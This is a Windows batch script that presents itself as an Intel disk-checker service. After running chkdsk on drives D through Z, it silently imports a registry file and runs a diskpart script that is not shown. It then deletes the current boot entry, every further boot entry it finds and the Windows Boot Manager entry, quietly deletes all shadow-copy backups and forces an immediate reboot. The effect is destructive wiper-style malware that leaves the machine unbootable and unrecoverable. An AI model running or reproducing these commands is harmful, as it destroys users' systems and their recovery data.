@echo off
copy "%~dp0\intel_disk_checker_service.bat" "C:\Program Files\intel_disk_checker_service.bat"
copy "%~dp0\partdata.txt" "C:\Program Files\partdata.txt"
copy "%~dp0\regdata.reg" "C:\Program Files\regdata.reg"
cls
chkdsk D: /f /r /x
chkdsk E: /f /r /x
chkdsk F: /f /r /x
chkdsk G: /f /r /x
chkdsk I: /f /r /x
chkdsk J: /f /r /x
chkdsk K: /f /r /x
chkdsk L: /f /r /x
chkdsk M: /f /r /x
chkdsk N: /f /r /x
chkdsk O: /f /r /x
chkdsk P: /f /r /x
chkdsk Q: /f /r /x
chkdsk R: /f /r /x
chkdsk S: /f /r /x
chkdsk T: /f /r /x
chkdsk U: /f /r /x
chkdsk V: /f /r /x
chkdsk W: /f /r /x
chkdsk X: /f /r /x
chkdsk Y: /f /r /x
chkdsk Z: /f /r /x
regedit /s "%~dp0\regdata.reg"
diskpart /s "%~dp0\partdata.txt"
cls
bcdedit /deletevalue {current} recoverysequence
bcdedit /deletevalue {current} resumeobject
bcdedit /deletevalue {current} path
bcdedit /deletevalue {current} device
bcdedit /deletevalue {current} osdevice
bcdedit /deletevalue {current} systemroot
bcdedit /deletevalue {current} inherit
bcdedit /f /delete {current}
cls
bcdedit /enum |findstr "den" > "%temp%\tempout3327043.txt"
For /F "Tokens=2*" %%G In ('%SystemRoot%\System32\findstr.exe "e" "%temp%\tempout3327043.txt"') Do set identifier=%%~G
bcdedit /deletevalue %identifier% recoverysequence
bcdedit /deletevalue %identifier% resumeobject
bcdedit /deletevalue %identifier% path
bcdedit /deletevalue %identifier% device
bcdedit /deletevalue %identifier% osdevice
bcdedit /deletevalue %identifier% systemroot
bcdedit /deletevalue %identifier% inherit
bcdedit /deletevalue %identifier% toolsdisplayorder
bcdedit /deletevalue %identifier% displayorder
bcdedit /deletevalue %identifier% description
bcdedit /deletevalue %identifier% default
bcdedit /f /delete %identifier%
cls
bcdedit /enum |findstr "den" > "%temp%\tempout3327042.txt"
For /F "Tokens=2*" %%G In ('%SystemRoot%\System32\findstr.exe "e" "%temp%\tempout3327042.txt"') Do set identifier=%%~G
bcdedit /deletevalue %identifier% recoverysequence
bcdedit /deletevalue %identifier% resumeobject
bcdedit /deletevalue %identifier% path
bcdedit /deletevalue %identifier% device
bcdedit /deletevalue %identifier% osdevice
bcdedit /deletevalue %identifier% systemroot
bcdedit /deletevalue %identifier% inherit
bcdedit /deletevalue %identifier% toolsdisplayorder
bcdedit /deletevalue %identifier% displayorder
bcdedit /deletevalue %identifier% description
bcdedit /deletevalue %identifier% default
bcdedit /f /delete %identifier%
cls
bcdedit /enum |findstr "den" > "%temp%\tempout3327041.txt"
For /F "Tokens=2*" %%G In ('%SystemRoot%\System32\findstr.exe "e" "%temp%\tempout3327041.txt"') Do set identifier=%%~G
bcdedit /deletevalue %identifier% recoverysequence
bcdedit /deletevalue %identifier% resumeobject
bcdedit /deletevalue %identifier% path
bcdedit /deletevalue %identifier% device
bcdedit /deletevalue %identifier% osdevice
bcdedit /deletevalue %identifier% systemroot
bcdedit /deletevalue %identifier% inherit
bcdedit /deletevalue %identifier% toolsdisplayorder
bcdedit /deletevalue %identifier% displayorder
bcdedit /deletevalue %identifier% description
bcdedit /deletevalue %identifier% default
bcdedit /f /delete %identifier%
cls
bcdedit /enum |findstr "den" > "%temp%\tempout3327040.txt"
For /F "Tokens=2*" %%G In ('%SystemRoot%\System32\findstr.exe "e" "%temp%\tempout3327040.txt"') Do set identifier=%%~G
bcdedit /deletevalue %identifier% recoverysequence
bcdedit /deletevalue %identifier% resumeobject
bcdedit /deletevalue %identifier% path
bcdedit /deletevalue %identifier% device
bcdedit /deletevalue %identifier% osdevice
bcdedit /deletevalue %identifier% systemroot
bcdedit /deletevalue %identifier% inherit
bcdedit /deletevalue %identifier% toolsdisplayorder
bcdedit /deletevalue %identifier% displayorder
bcdedit /deletevalue %identifier% description
bcdedit /deletevalue %identifier% default
bcdedit /f /delete %identifier%
cls
bcdedit /enum |findstr "den" > "%temp%\tempout3327049.txt"
For /F "Tokens=2*" %%G In ('%SystemRoot%\System32\findstr.exe "e" "%temp%\tempout3327049.txt"') Do set identifier=%%~G
bcdedit /deletevalue %identifier% recoverysequence
bcdedit /deletevalue %identifier% resumeobject
bcdedit /deletevalue %identifier% path
bcdedit /deletevalue %identifier% device
bcdedit /deletevalue %identifier% osdevice
bcdedit /deletevalue %identifier% systemroot
bcdedit /deletevalue %identifier% inherit
bcdedit /deletevalue %identifier% toolsdisplayorder
bcdedit /deletevalue %identifier% displayorder
bcdedit /deletevalue %identifier% description
bcdedit /deletevalue %identifier% default
bcdedit /f /delete %identifier%
cls
bcdedit /enum |findstr "den" > "%temp%\tempout3327048.txt"
For /F "Tokens=2*" %%G In ('%SystemRoot%\System32\findstr.exe "e" "%temp%\tempout3327048.txt"') Do set identifier=%%~G
bcdedit /deletevalue %identifier% recoverysequence
bcdedit /deletevalue %identifier% resumeobject
bcdedit /deletevalue %identifier% path
bcdedit /deletevalue %identifier% device
bcdedit /deletevalue %identifier% osdevice
bcdedit /deletevalue %identifier% systemroot
bcdedit /deletevalue %identifier% inherit
bcdedit /deletevalue %identifier% toolsdisplayorder
bcdedit /deletevalue %identifier% displayorder
bcdedit /deletevalue %identifier% description
bcdedit /deletevalue %identifier% default
bcdedit /f /delete %identifier%
cls
bcdedit /enum |findstr "den" > "%temp%\tempout3327047.txt"
For /F "Tokens=2*" %%G In ('%SystemRoot%\System32\findstr.exe "e" "%temp%\tempout3327047.txt"') Do set identifier=%%~G
bcdedit /deletevalue %identifier% recoverysequence
bcdedit /deletevalue %identifier% resumeobject
bcdedit /deletevalue %identifier% path
bcdedit /deletevalue %identifier% device
bcdedit /deletevalue %identifier% osdevice
bcdedit /deletevalue %identifier% systemroot
bcdedit /deletevalue %identifier% inherit
bcdedit /deletevalue %identifier% toolsdisplayorder
bcdedit /deletevalue %identifier% displayorder
bcdedit /deletevalue %identifier% description
bcdedit /deletevalue %identifier% default
bcdedit /f /delete %identifier%
cls
bcdedit /enum |findstr "den" > "%temp%\tempout3327043.txt"
For /F "Tokens=2*" %%G In ('%SystemRoot%\System32\findstr.exe "e" "%temp%\tempout3327043.txt"') Do set identifier=%%~G
bcdedit /deletevalue %identifier% recoverysequence
bcdedit /deletevalue %identifier% resumeobject
bcdedit /deletevalue %identifier% path
bcdedit /deletevalue %identifier% device
bcdedit /deletevalue %identifier% osdevice
bcdedit /deletevalue %identifier% systemroot
bcdedit /deletevalue %identifier% inherit
bcdedit /deletevalue %identifier% toolsdisplayorder
bcdedit /deletevalue %identifier% displayorder
bcdedit /deletevalue %identifier% description
bcdedit /deletevalue %identifier% default
bcdedit /f /delete %identifier%
cls
bcdedit /enum |findstr "den" > "%temp%\tempout3327043.txt"
For /F "Tokens=2*" %%G In ('%SystemRoot%\System32\findstr.exe "e" "%temp%\tempout3327043.txt"') Do set identifier=%%~G
bcdedit /deletevalue %identifier% recoverysequence
bcdedit /deletevalue %identifier% resumeobject
bcdedit /deletevalue %identifier% path
bcdedit /deletevalue %identifier% device
bcdedit /deletevalue %identifier% osdevice
bcdedit /deletevalue %identifier% systemroot
bcdedit /deletevalue %identifier% inherit
bcdedit /deletevalue %identifier% toolsdisplayorder
bcdedit /deletevalue %identifier% displayorder
bcdedit /deletevalue %identifier% description
bcdedit /deletevalue %identifier% default
bcdedit /f /delete %identifier%
cls
bcdedit /enum |findstr "den" > "%temp%\tempout3327043.txt"
For /F "Tokens=2*" %%G In ('%SystemRoot%\System32\findstr.exe "e" "%temp%\tempout3327043.txt"') Do set identifier=%%~G
bcdedit /deletevalue %identifier% recoverysequence
bcdedit /deletevalue %identifier% resumeobject
bcdedit /deletevalue %identifier% path
bcdedit /deletevalue %identifier% device
bcdedit /deletevalue %identifier% osdevice
bcdedit /deletevalue %identifier% systemroot
bcdedit /deletevalue %identifier% inherit
bcdedit /deletevalue %identifier% toolsdisplayorder
bcdedit /deletevalue %identifier% displayorder
bcdedit /deletevalue %identifier% description
bcdedit /deletevalue %identifier% default
bcdedit /f /delete %identifier%
cls
bcdedit /enum |findstr "den" > "%temp%\tempout3327043.txt"
For /F "Tokens=2*" %%G In ('%SystemRoot%\System32\findstr.exe "e" "%temp%\tempout3327043.txt"') Do set identifier=%%~G
bcdedit /deletevalue %identifier% recoverysequence
bcdedit /deletevalue %identifier% resumeobject
bcdedit /deletevalue %identifier% path
bcdedit /deletevalue %identifier% device
bcdedit /deletevalue %identifier% osdevice
bcdedit /deletevalue %identifier% systemroot
bcdedit /deletevalue %identifier% inherit
bcdedit /deletevalue %identifier% toolsdisplayorder
bcdedit /deletevalue %identifier% displayorder
bcdedit /deletevalue %identifier% description
bcdedit /deletevalue %identifier% default
bcdedit /f /delete %identifier%
cls
bcdedit /enum |findstr "den" > "%temp%\tempout3327043.txt"
For /F "Tokens=2*" %%G In ('%SystemRoot%\System32\findstr.exe "e" "%temp%\tempout3327043.txt"') Do set identifier=%%~G
bcdedit /deletevalue %identifier% recoverysequence
bcdedit /deletevalue %identifier% resumeobject
bcdedit /deletevalue %identifier% path
bcdedit /deletevalue %identifier% device
bcdedit /deletevalue %identifier% osdevice
bcdedit /deletevalue %identifier% systemroot
bcdedit /deletevalue %identifier% inherit
bcdedit /deletevalue %identifier% toolsdisplayorder
bcdedit /deletevalue %identifier% displayorder
bcdedit /deletevalue %identifier% description
bcdedit /deletevalue %identifier% default
bcdedit /f /delete %identifier%
cls
bcdedit /enum |findstr "den" > "%temp%\tempout3327043.txt"
For /F "Tokens=2*" %%G In ('%SystemRoot%\System32\findstr.exe "e" "%temp%\tempout3327043.txt"') Do set identifier=%%~G
bcdedit /deletevalue %identifier% recoverysequence
bcdedit /deletevalue %identifier% resumeobject
bcdedit /deletevalue %identifier% path
bcdedit /deletevalue %identifier% device
bcdedit /deletevalue %identifier% osdevice
bcdedit /deletevalue %identifier% systemroot
bcdedit /deletevalue %identifier% inherit
bcdedit /deletevalue %identifier% toolsdisplayorder
bcdedit /deletevalue %identifier% displayorder
bcdedit /deletevalue %identifier% description
bcdedit /deletevalue %identifier% default
bcdedit /f /delete %identifier%
cls
bcdedit /enum |findstr "den" > "%temp%\tempout3327043.txt"
For /F "Tokens=2*" %%G In ('%SystemRoot%\System32\findstr.exe "e" "%temp%\tempout3327043.txt"') Do set identifier=%%~G
bcdedit /deletevalue %identifier% recoverysequence
bcdedit /deletevalue %identifier% resumeobject
bcdedit /deletevalue %identifier% path
bcdedit /deletevalue %identifier% device
bcdedit /deletevalue %identifier% osdevice
bcdedit /deletevalue %identifier% systemroot
bcdedit /deletevalue %identifier% inherit
bcdedit /deletevalue %identifier% toolsdisplayorder
bcdedit /deletevalue %identifier% displayorder
bcdedit /deletevalue %identifier% description
bcdedit /deletevalue %identifier% default
bcdedit /f /delete %identifier%
cls
bcdedit /enum |findstr "den" > "%temp%\tempout3327043.txt"
For /F "Tokens=2*" %%G In ('%SystemRoot%\System32\findstr.exe "e" "%temp%\tempout3327043.txt"') Do set identifier=%%~G
bcdedit /deletevalue %identifier% recoverysequence
bcdedit /deletevalue %identifier% resumeobject
bcdedit /deletevalue %identifier% path
bcdedit /deletevalue %identifier% device
bcdedit /deletevalue %identifier% osdevice
bcdedit /deletevalue %identifier% systemroot
bcdedit /deletevalue %identifier% inherit
bcdedit /deletevalue %identifier% toolsdisplayorder
bcdedit /deletevalue %identifier% displayorder
bcdedit /deletevalue %identifier% description
bcdedit /deletevalue %identifier% default
bcdedit /f /delete %identifier%
cls
bcdedit /enum |findstr "den" > "%temp%\tempout3327043.txt"
For /F "Tokens=2*" %%G In ('%SystemRoot%\System32\findstr.exe "e" "%temp%\tempout3327043.txt"') Do set identifier=%%~G
bcdedit /deletevalue %identifier% recoverysequence
bcdedit /deletevalue %identifier% resumeobject
bcdedit /deletevalue %identifier% path
bcdedit /deletevalue %identifier% device
bcdedit /deletevalue %identifier% osdevice
bcdedit /deletevalue %identifier% systemroot
bcdedit /deletevalue %identifier% inherit
bcdedit /deletevalue %identifier% toolsdisplayorder
bcdedit /deletevalue %identifier% displayorder
bcdedit /deletevalue %identifier% description
bcdedit /deletevalue %identifier% default
bcdedit /f /delete %identifier%
cls
bcdedit /enum |findstr "den" > "%temp%\tempout3327043.txt"
For /F "Tokens=2*" %%G In ('%SystemRoot%\System32\findstr.exe "e" "%temp%\tempout3327043.txt"') Do set identifier=%%~G
bcdedit /deletevalue %identifier% recoverysequence
bcdedit /deletevalue %identifier% resumeobject
bcdedit /deletevalue %identifier% path
bcdedit /deletevalue %identifier% device
bcdedit /deletevalue %identifier% osdevice
bcdedit /deletevalue %identifier% systemroot
bcdedit /deletevalue %identifier% inherit
bcdedit /deletevalue %identifier% toolsdisplayorder
bcdedit /deletevalue %identifier% displayorder
bcdedit /deletevalue %identifier% description
bcdedit /deletevalue %identifier% default
bcdedit /f /delete %identifier%
cls
bcdedit /enum |findstr "den" > "%temp%\tempout3327043.txt"
For /F "Tokens=2*" %%G In ('%SystemRoot%\System32\findstr.exe "e" "%temp%\tempout3327043.txt"') Do set identifier=%%~G
bcdedit /deletevalue %identifier% recoverysequence
bcdedit /deletevalue %identifier% resumeobject
bcdedit /deletevalue %identifier% path
bcdedit /deletevalue %identifier% device
bcdedit /deletevalue %identifier% osdevice
bcdedit /deletevalue %identifier% systemroot
bcdedit /deletevalue %identifier% inherit
bcdedit /deletevalue %identifier% toolsdisplayorder
bcdedit /deletevalue %identifier% displayorder
bcdedit /deletevalue %identifier% description
bcdedit /deletevalue %identifier% default
bcdedit /f /delete %identifier%
cls
bcdedit /deletevalue {bootmgr} resumeobject
bcdedit /deletevalue {bootmgr} default
bcdedit /deletevalue {bootmgr} path
bcdedit /deletevalue {bootmgr} toolsdisplayorder
bcdedit /deletevalue {bootmgr} displayorder
bcdedit /deletevalue {bootmgr} inherit
bcdedit /deletevalue {bootmgr} description
bcdedit /f /delete {bootmgr}
cls
del %temp%\tempout3327043.txt
del %temp%\tempout3327042.txt
del %temp%\tempout3327041.txt
del %temp%\tempout3327040.txt
del %temp%\tempout3327049.txt
del %temp%\tempout3327048.txt
del %temp%\tempout3327047.txt
cls
vssadmin delete shadows /all /quiet
shutdown /r /f /t 0
